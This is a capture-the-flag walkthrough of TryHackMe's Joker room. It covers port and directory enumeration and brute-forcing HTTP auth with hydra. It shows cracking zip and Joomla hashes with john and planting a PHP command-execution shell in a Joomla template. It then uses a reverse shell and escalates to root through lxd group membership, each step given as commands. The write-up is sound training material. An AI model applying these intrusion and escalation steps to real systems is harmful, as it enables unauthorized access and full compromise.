# 30 - HA Joker CTF

Room Link --> [https://tryhackme.com/room/jokerctf](https://tryhackme.com/room/jokerctf)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.10.121.217 -sS -Pn -n -p- -T5 -vv

# output
PORT     STATE    SERVICE REASON      VERSION
22/tcp   filtered ssh        no-response
80/tcp   open     http    syn-ack     Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open     http    syn-ack     Apache httpd 2.4.29
```
{% endcode %}

#### Gobuster Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.121.217 -w /usr/share/dirb/wordlists/common.txt -x txt -t 500 2>/dev/null

# outputs
/phpinfo.php         
/secret.txt
```
{% endcode %}

#### Bruteforcing Joker Password

{% code overflow="wrap" lineNumbers="true" %}
```bash
# i used hydra.
hydra -l joker -P /usr/share/wordlists/rockyou.txt -f 10.10.121.217 -s 8080 http-get /

# outputs
[8080][http-get] host: 10.10.121.217   login: joker   password: hannah
```
{% endcode %}

<figure><img src=".gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

We see a Joomla CMS.

#### Enumerating Authenticated Joomla webpage

Navigating to [http://10.10.121.217:8080/robots.txt](http://10.10.121.217:8080/robots.txt)

<figure><img src=".gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

#### Using Nikto Scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nikto -host 10.10.121.217 -id "joker:hannah" -port 8080

# outputs

```
{% endcode %}

<figure><img src=".gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

There is a "backu.zip" file.

Cracking the Zip file using johnthereaper.

{% code overflow="wrap" lineNumbers="true" %}
```bash
zip2john backup.zip > passwd.zip
john passwd.zip --wordlist=/usr/share/wordlists/rockyou.txt

# ouptput
hannah           (backup.zip)

# to unzip
unzip backup.zip
```
{% endcode %}

There are 2 dirs:

<figure><img src=".gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

We found the superdoper user..

<figure><img src=".gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG'
</strong><strong>
</strong><strong># cracking the password.
</strong>john passwd --wordlist=/usr/share/wordlists/rockyou.txt

# outputs
abcd1234         (?)

# we have the login credentials now:
admin : abcd1234
</code></pre>

### Initial Access

#### Joomla RCE

UPloading PHP payload in the admin panel.

Goto `Templates` , select any template (protostar), select the "error.php" page, add `system($_GET['cmd']);` to the page.

<figure><img src=".gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Navigate to `http://10.10.119.72:8080/templates/protostar/error.php/error.php?cmd=id` - for code execution.

<figure><img src=".gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

We have code execution.

So for easy Reverse shell, i just uploaded the nishang php rev shell to the error.php page and setup nc listener to catch the connection.

<figure><img src=".gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

Then Navigate to `http://10.10.119.72:8080/templates/protostar/error.php/error.php`

<figure><img src=".gitbook/assets/image (220).png" alt=""><figcaption><p>Got shell.</p></figcaption></figure>

The user is in the "lxd" group.

`uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)`

### Priv Esc

#### lxd exploitation

{% code overflow="wrap" lineNumbers="true" %}
```bash
# lets check if there is an image already in the box.
lxc image list
# i added my own image.
```
{% endcode %}

Download image from --> [https://github.com/saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)

{% code overflow="wrap" lineNumbers="true" %}
```bash
# enter the below cmds and adjust as necessary.

# 1
# build the image on kali 1st.
./build-alpine

# 2
# Now import the .tar into the target machine.
python -m http.server 80
wget http://<ip>/

# 3
# use any name for alias.
lxc image import alpine-v3.18-x86_64-20231020_0952.tar.gz --alias alpine-v3.3
lxc image list # you should see a new image added in the list.
lxc init alpine-v3.3 ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id # should be root by now.
cd /mnt/root # go here to access root files.
# Done
```
{% endcode %}

<figure><img src=".gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

Done!
